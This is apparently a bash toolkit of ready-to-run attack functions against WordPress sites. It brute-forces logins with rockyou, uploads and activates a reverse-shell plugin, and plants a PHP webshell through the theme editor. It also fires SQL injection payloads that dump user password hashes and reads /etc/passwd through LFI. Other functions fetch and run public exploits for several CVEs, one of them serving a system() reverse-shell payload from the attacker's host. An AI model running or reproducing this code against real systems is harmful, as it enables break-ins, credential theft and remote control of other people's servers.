#!/bin/bash

run_wpscan() {
    if [[ ! -z $1 ]]; then
        target_url="$1"
    fi
    if [[ -z "$target_url" ]]; then
        echo "Usage: run_wpscan <url>"
        return 1
    fi
    if [[ $target_url == *https* ]]; then
        wpscan_additional_options+=" --disable_tls_checks"

    fi
    target_url=$(echo "$target_url" | sed 's/\/$//')
    if [[ -z $enumerate_wpscan ]]; then
        enumerate_wpscan="true"
    fi
    if [[ -z $enumeration_option ]]; then
        enumeration_option="ap --plugins-detection aggressive"
    fi
    local wpscan_log="wpscan_$(echo $target_url | sed 's/[:\/]/_/g')"
    if [[ ! -z "$enumeration_option" ]]; then
        wpscan_log="${wpscan_log}_${enumeration_option// /_}"
    fi
    if [[ ! -z "$wpscan_additional_options" ]]; then
        wpscan_log="${wpscan_log}_$(echo $wpscan_additional_options | sed 's/ /_/g' | sed 's/[:\/]/_/g')"
    fi
    wpscan_log="${wpscan_log}.log"
    if [[ ! -z "$log_dir" ]]; then
        wpscan_log="$log_dir/$wpscan_log"
    fi
    if [[ -f "$wpscan_log" ]]; then
        echo "WPScan output already exists, skipping scan."
        return
    fi
    local proxy_command=""
    if [[ ! -z $use_proxychain ]] && [[ $use_proxychain == "true" ]]; then
        proxy_command="proxychains -q "
        echo "Using proxychains for WPScan."
    fi
    echo "Running WPScan..."
    local wpscan_enumeration_option=""
    if [[ $enumerate_wpscan == "true" ]]; then
        wpscan_enumeration_option="--enumerate $enumeration_option"
    fi
    local wpsscan_cmd="${proxy_command}wpscan --no-update --url $target_url $wpscan_enumeration_option $wpscan_additional_options"
    echo $wpsscan_cmd
    eval $wpsscan_cmd | tee >(remove_color_to_log >> $wpscan_log)
}

enumerate_wp_users() {
    local target_host="$1"
    if [[ -z "$target_host" ]] && [[ -z $target_url ]]; then
        echo "Usage: enumerate_wp_users <target_host>"
        return 1
    fi
    enumeration_option="u"
    run_wpscan "$target_host"
}

brute_force_wp_login() {
    local target_host="$1"
    if [[ -z "$target_host" ]]; then
        echo "Usage: brute_force_wp_login <target_host>"
        return 1
    fi
    enumerate_wpscan="false"
    wpscan_additional_options="--passwords /usr/share/wordlists/rockyou.txt"
    run_wpscan "$target_host"
}

login_wp() {
    if [[ -z "$target_url" ]]; then
        echo "Target hostname is not set. Using ip"
        target_url=http://$ip
    fi
    if [[ -z "$cookie_jar" ]]; then
        cookie_jar="wp-cookie.txt"
    fi    
    curl -s -c $cookie_jar "$target_url/wp-login.php" > /dev/null
    if [[ -z "$username" ]] || [[ -z "$password" ]]; then
        echo "Target username or password needs to be set"
        return 1
    fi
    echo "Logging in to WordPress at $target_url/wp-login.php"
    curl -s -b $cookie_jar -c $cookie_jar -d "log=$username" -d "pwd=$password" \
        -d "wp-submit=Log+In" -d "redirect_to=$target_url/wp-admin/" -d "testcookie=1" \
        $target_url/wp-login.php
    
}

upload_plugin() {
    echo "Start of uploading plugin..."
    if [[ -z "$cookie_jar" ]]; then
        echo "Cookie jar is not set. Please login first"
        return 1
    fi
    if [[ -z "$plugin_name" ]]; then
        echo "Plugin name is not set. Please create a plugin first"
        return 1
    fi
    if [[ ! -f "$plugin_file" ]]; then
        echo "Plugin file $plugin_file does not exist. Please create a plugin first"
        return 1
    else
        echo "Plugin file $plugin_file exists, proceeding with upload"
    fi
    if [[ -z "$target_url" ]]; then
        echo "Target hostname is not set. Using ip"
        target_url=http://$ip
    fi
    target_url=$(echo "$target_url" | sed 's/\/$//')
    local plugin_page=""
    plugin_page=$(curl -s -b "$cookie_jar" -c "$cookie_jar" "$target_url/wp-admin/plugins.php" | grep "$plugin_name" )
    if [[ -z "$plugin_page" ]]; then
        echo "Plugin not found, uploading..."
        nonce=$(curl -s -b "$cookie_jar" -c "$cookie_jar" "$target_url/wp-admin/plugin-install.php?tab=upload"| grep -oP 'name="_wpnonce" value="\K[^"]+')
        echo "Nonce: $nonce"    
        curl -s -b "$cookie_jar" -c "$cookie_jar" -F "_wpnonce=$nonce" -F "_wp_http_referer=/wp-admin/plugin-install.php" -F "pluginzip=@$plugin_file" "$target_url/wp-admin/update.php?action=upload-plugin"  >upload_result.txt
    fi
    plugin_page=$(curl -s -b "$cookie_jar" -c "$cookie_jar" "$target_url/wp-admin/plugins.php" | grep "$plugin_name" )
    if [[ -z "$plugin_page" ]]; then
        echo "Plugin not found after upload."
        return 1
    fi
    deactivate=$(echo "$plugin_page" | grep "Deactivate" )
    if [[ ! -z "$deactivate" ]]; then
        echo "Plugin has already been activated."
    else
        echo "Plugin is not activated, activating now..."
        echo "$plugin_page" > plugin_page.txt
        activate_url=$(echo "$plugin_page" | grep -oP "<span class='activate'><a href=\"\K[^\"]+" | sed 's/\&amp;/\&/g')
        echo "$activate_url"
        curl -s -v -b $cookie_jar -c $cookie_jar "$target_url/wp-admin/$activate_url" > activation_result.txt
    fi

    plugin_page=$(curl -s -b $cookie_jar -c $cookie_jar "$target_url/wp-admin/plugins.php" | grep "$plugin_name" )
    deactivate=$(echo "$plugin_page" | grep "Deactivate" )
    if [[ -z "$deactivate" ]]; then
        echo "Plugin is not activated, activation failed."
        echo "$plugin_page" > plugin_page.txt
        echo "$deactivate" > deactivate.txt
        return 1
    fi

}

create_wp_plugin_reverse_shell() {
    plugin_name="reverse-shell-plugin"
    mkdir -p $PWD/$plugin_name
    cp "$SCRIPTDIR/../php/wp-$plugin_name.php" $plugin_name/$plugin_name.php
    if [[ -z $cmd ]]; then
        cmd=$(get_bash_reverse_shell)
    fi
    cmd=$(echo "$cmd" | sed -E 's/"/\\"/g')        
    cmd=$(escape_sed "$cmd")
    sed -E -i "s/\{cmd\}/$cmd/g" $plugin_name/$plugin_name.php
    plugin_file="$plugin_name.zip"
    zip -r $plugin_file $plugin_name
}

run_wp_plugin_reverse_shell() {
    if [[ -z "$target_url" ]]; then
        echo "Target hostname is not set. Using ip"
        target_url=http://$ip
    fi
    if [[ -z "$cookie_jar" ]]; then
        echo "Cookie jar is not set. Please login first"
        return 1
    fi
    if [[ -z "$plugin_name" ]]; then
        echo "Plugin name is not set. Please create a plugin first"
        return 1
    fi
    local shell_url="$target_url/wp-admin/admin.php?page=$plugin_name"
    echo "Running reverse shell at $shell_url"
    local plugin_page=""
    plugin_page=$(curl -s -b "$cookie_jar" -c "$cookie_jar" "$shell_url")
    if [[ -z "$plugin_page" ]]; then
        echo "Plugin page is empty. Plugin may not be activated or not uploaded correctly."
        return 1
    fi
    echo "$plugin_page" | awk '/<pre>/,/<\/pre>/'
}

#CVE 2021 24762
#https://wpscan.com/vulnerability/c1620905-7c31-4e62-80f5-1d9635be11ad/
run_perfect_survey_exploit() {
    local target_host="$1"
    if [[ -z "$target_host" ]]; then
        echo "Usage: run_perfect_survey_exploit <target_host>"
        return 1
    fi
    poc="wp-admin/admin-ajax.php?action=get_question&question_id=1%20union%20select%201%2C1%2Cchar(116%2C101%2C120%2C116)%2Cuser_login%2Cuser_pass%2C0%2C0%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%20from%20wp_users"
    url="http://$target_host/$poc"
    curl -s "$url" | sed 's/\\"/"/g' | sed 's/\\\//\//g' | grep -oP 'value="\K[^"]+' 

}

perform_cve_2024_9796() {
    if [[ -z $target_url ]]; then
        target_url=http://$ip
        echo "Target URL is set to $target_url"
    fi
    if [[ -z $sql_cmd ]]; then
        sql_cmd="wp_users UNION SELECT user_pass FROM wp_users --"
    fi
    local t="$sql_cmd"
    t=$(urlencode "$t")
    echo "$t"
    q=admin
    f=user_login
    type=""
    e=""
    local url="$target_url/wp-content/plugins/wp-advanced-search/class.inc/autocompletion/autocompletion-PHP5.5.php" 
    curl -v "$url?q=$q&f=$f&t=$t&type=$type&e=$e" \
        --proxy localhost:8080

}

perform_cve_2025_39538() {
    local url="https://raw.githubusercontent.com/Nxploited/CVE-2025-39538/refs/heads/main/CVE-2025-39538.py"
    local cve_dir="CVE-2025-39538"
    if [[ ! -d "$cve_dir" ]]; then
        mkdir -p "$cve_dir"
    fi
    if [[ -z $target_url ]]; then
        target_url=http://$ip
        echo "Target URL is set to $target_url"
    fi
    if [[ -z $username ]]; then
        echo "username is not set"
        return 1
    fi
    if [[ -z $password ]]; then
        echo "password is not set"
        return 1
    fi
    pushd "$cve_dir" || return 1
    if [[ ! -f CVE-2025-39538.py ]]; then
        curl -s -o "CVE-2025-39538.py" "$url"
    fi
    python3 CVE-2025-39538.py -u $target_url -un $username -p $password
    popd || return 1
}

perform_cve_2019_9978() {
    local cve_dir="CVE-2019-9978"
    local url="https://github.com/hash3liZer/CVE-2019-9978/archive/refs/heads/master.zip"
    if [[ ! -d "$cve_dir" ]]; then
        wget $url -O $cve_dir.zip
        unzip -q $cve_dir.zip
        mv CVE-2019-9978-master $cve_dir
    fi
    if [[ -z $target_url ]]; then
        echo "Target URL is not set"
        return 1
    fi
    if [[ -z $cmd ]]; then
        cmd=$(get_bash_reverse_shell)
    fi
    payload_txt_file="payload.txt"
    echo "<pre>system('$cmd')</pre>" > $payload_txt_file
    pushd "$cve_dir" || return 1
    payload_uri="http://$http_ip:$http_port/$payload_txt_file"
    echo "target_url: $target_url"
    echo "payload_uri: $payload_uri"
    2to3 -w cve-2019-9978.py 
    python3 cve-2019-9978.py --target $target_url --payload-uri $payload_uri
    popd || return 1


}

perform_cve_2020_24186() {
    local cve_dir="CVE-2020-24186"
    if [[ ! -d "$cve_dir" ]]; then
        mkdir -p "$cve_dir"
    fi
    if [[ -z $target_url ]]; then
        echo "Target URL is not set"
        return 1
    fi
    if [[ -z $target_path ]]; then
        echo "Target path is not set"
        return 1
    fi
    pushd "$cve_dir" || return 1
    if [[ ! -f 49967.py ]]; then
        searchsploit -m 49967
    fi
    sed -E 's/^code_exec/#code_exec/' 49967.py > temp.py
    webshell_url=$(python3 temp.py -u "$target_url" -p $target_path | grep Success | grep -oP '\Khttp://[^&]+')
    echo "Webshell URL: $webshell_url"
    popd || return 1

}

#for unauthenticated LFI exploitation or SQL injection
#   example SQL injection
#   exploit_type=sqli
#   perform_cve_2017_6095 "0 union select $sql_nulls_front,user_login, user_pass, $sql_nulls_end from wordpress.wp_users; -- //"
#   perform_cve_2017_6095 "0 union select $sql_nulls_front,user_pass, user_pass, $sql_nulls_end from wordpress.wp_users; -- //"
#   example LFI exploitation
#   exploit_type=lfi
#   perform_cve_2017_6095 "/etc/passwd"

perform_cve_2017_6095() {

    local cve_dir="CVE-2017-6095"
    if [[ ! -d "$cve_dir" ]]; then
        mkdir -p "$cve_dir"
    fi
    if [[ -z $target_url ]]; then
        echo "Target URL is not set"
        return 1
    fi
    if [[ -z $exploit_type ]]; then
        exploit_type="sqli"
    fi
    if [[ ! -z $1 ]]; then
        if [[ $exploit_type == "lfi" ]]; then
            target_file="$1"
        elif [[ $exploit_type == "sqli" ]]; then
            sql_cmd="$1"
        else
            echo "Invalid exploit_type: $exploit_type"
            return 1
        fi
    fi
    if [[ $exploit_type == "sqli" ]]; then
        if [[ -z $target_file ]]; then
            target_file="/var/www/html/wordpress/wp-load.php"
        elif [[ $target_file != *"wp-load.php"* ]]; then
            target_file="/var/www/html/wordpress/wp-load.php"
        fi
        echo "Using SQL injection exploit with $target_file"
    fi    
    local list_id=""
    if [[ ! -z $sql_cmd ]]; then
        list_id=$(urlencode "$sql_cmd")
    fi
    pushd "$cve_dir" || return 1
    echo "sql_cmd: $sql_cmd"
    pl=$(urlencode "$target_file")
    if [[ -z $username ]] && [[ -z $password ]]; then
        echo "username or password is not set, using unauthenticated access"
        curl -s "$target_url/wp-content/plugins/mail-masta/inc/lists/csvexport.php?pl=$pl&list_id=$list_id" --proxy localhost:8080 
    else
        login_wp
        curl -b "$cookie_jar" -c "$cookie_jar" "$target_url/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=$pl" --proxy localhost:8080 \
            -d "camp_id=$list_id"
    fi
    popd || return 1

}

perform_wordpress_themeeditor_exploit() {
    local exploit_dir="wp-theme-editor-exploit"
    #local url="https://github.com/nisforrnicholas/WordPress-Theme-Editor-Exploit/archive/refs/heads/main.zip"
    if [[ ! -d "$exploit_dir" ]]; then
        mkdir -p "$exploit_dir"
    fi
    if [[ -z $target_url ]]; then
        echo "Target URL is not set"
        return 1
    fi
    if [[ -z $username ]]; then
        echo "username is not set"
        return 1
    fi
    if [[ -z $password ]]; then
        echo "password is not set"
        return 1
    fi
    if [[ -z $theme_name ]]; then
        echo "theme_name is not set"
        return 1
    fi
    if [[ -z $host_ip ]]; then
        host_ip=$(get_host_ip)
        echo "host_ip is not set, using $host_ip"
    fi
    if [[ -z $host_port ]]; then
        host_port=4444
        echo "host_port is not set, using $host_port"
    fi
    pushd "$exploit_dir" || return 1
    login_wp
    local response=$(curl -s -b "$cookie_jar" -c "$cookie_jar" "$target_url/wp-admin/theme-editor.php" \
        -d "theme=$theme_name" \
        -d "file=comments.php" \
        -d "Submit=Select" )      
    echo "$response" > response.html
    hidden_inputs=$(extract_hidden_input "$response" "template")
    hidden_inputs=$(echo $hidden_inputs | sed -E 's/^,//')
    hidden_inputs=$(echo $hidden_inputs | sed -E 's/,/\&/g')
    if [[ -z "$hidden_inputs" ]]; then
        echo "Failed to extract hidden inputs."
        return 1
    fi
    echo "$response" | awk '/<textarea\>/ {flag=1; next} (flag) {print} /<\/textarea>/ {flag=0}' 
    minimize_webshell=true
    create_php_webshell
    webshell=$(cat webshell.php)
    response=$(curl -s -b "$cookie_jar" -c "$cookie_jar" "$target_url/wp-admin/theme-editor.php" \
        -d "newcontent=$webshell" \
        -d "$hidden_inputs" \
        -d "newcontent=$(urlencode "$webshell")" \
        -d "Submit=Update+File" )
    curl -s -b "$cookie_jar" -c "$cookie_jar" "$target_url/wp-content/themes/$theme_name/comments.php" --proxy localhost:8080
    popd || return 1

}